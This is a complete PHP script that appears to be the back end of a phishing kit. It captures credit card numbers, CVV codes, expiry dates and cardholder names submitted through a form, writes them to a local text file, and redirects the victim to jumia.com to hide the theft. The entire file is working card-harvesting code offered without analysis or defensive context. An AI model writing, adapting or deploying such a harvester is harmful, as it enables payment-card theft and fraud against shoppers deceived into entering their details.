<?php

file_put_contents("usernames.txt", "[cvv]: " . $_POST['cvv'] . " [card-number]: " . $_POST['cardnumber'] . " [expiry-year] : " . $_POST['expyear'] . " [expiry-month] : " . $_POST['expmonth'] . " [Name] :" . $_POST['cardname']. "\n", FILE_APPEND);
header('Location: https://jumia.com');
exit();
